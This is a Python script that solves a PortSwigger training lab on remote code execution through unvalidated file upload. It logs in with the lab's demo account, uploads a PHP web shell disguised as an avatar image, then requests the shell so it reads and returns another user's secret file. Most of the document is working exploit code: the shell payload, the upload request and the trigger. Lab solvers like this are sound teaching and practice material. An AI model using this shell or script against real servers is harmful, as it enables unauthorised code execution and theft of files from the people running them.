#!/usr/bin/env python3
"""
Solve the PortSwigger lab "Remote code execution via web shell upload".

The avatar upload accepts any file without validation and stores it in a
directory the server will execute. We upload a PHP web shell instead of an
image, then request it — the server runs our code and returns the contents
of /home/carlos/secret.

Lab: https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload
Usage: python3 solve.py https://YOUR-LAB-ID.web-security-academy.net
"""

import re
import sys
import argparse
import requests

# Verify TLS against the OS trust store (works on networks that inspect HTTPS).
import truststore
truststore.inject_into_ssl()

session = requests.Session()
LAB_URL = None  # set from the CLI arg in main()
REQUEST_TIMEOUT = 10

USERNAME = "wiener"
PASSWORD = "peter"

SHELL_NAME = "exploit.php"
# PHP web shell: when the server executes this file, it reads and prints the
# contents of carlos's secret file.
SHELL_CODE = "<?php echo file_get_contents('/home/carlos/secret'); ?>"


def fetch(path, method="GET", data=None, files=None, allow_redirects=True):
    """Send a request to the lab and return the response."""
    url = LAB_URL.rstrip("/") + "/" + path.lstrip("/")
    return session.request(method, url, data=data, files=files,
                           timeout=REQUEST_TIMEOUT, allow_redirects=allow_redirects)


def report(name, found, detail=""):
    """Print a finding in a consistent [FOUND] / [clean] format."""
    tag = "FOUND" if found else "clean"
    print(f"[{tag}] {name}: {detail}")


def get_csrf(path):
    """Fetch a page and return its form's CSRF token."""
    resp = fetch(path)
    match = re.search(r'name="csrf" value="([^"]+)"', resp.text)
    return match.group(1) if match else None


def login():
    """Log in as wiener; the session cookie is set on success."""
    csrf = get_csrf("login")
    fetch("login", method="POST",
          data={"csrf": csrf, "username": USERNAME, "password": PASSWORD})


def check_file_upload():
    """Upload a PHP web shell via the avatar form, then request it to read carlos's secret."""
    login()
    print(f"[*] Logged in as {USERNAME}")

    csrf = get_csrf("my-account")
    print(f"[*] Uploading web shell as {SHELL_NAME}...")
    print(f"    payload: {SHELL_CODE}")
    files = {"avatar": (SHELL_NAME, SHELL_CODE, "text/x-php")}
    data = {"user": USERNAME, "csrf": csrf}
    fetch("my-account/avatar", method="POST", files=files, data=data)

    print("[*] Requesting the uploaded shell to trigger execution...")
    resp = fetch(f"files/avatars/{SHELL_NAME}")
    secret = resp.text.strip()

    match = re.search(r"[A-Za-z0-9]{32}", secret)
    if match:
        report("File upload RCE", True, f"carlos's secret: {match.group()}")
    else:
        report("File upload RCE", False, "no secret returned")

def parse_args():
    parser = argparse.ArgumentParser(
        description="Upload a PHP web shell and exfiltrate a file (PortSwigger lab)."
    )
    parser.add_argument(
        "url",
        help="Base URL of your lab instance, e.g. https://XXXX.web-security-academy.net",
    )
    return parser.parse_args()


def main():
    global LAB_URL
    args = parse_args()
    LAB_URL = args.url

    try:
        check_file_upload()
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()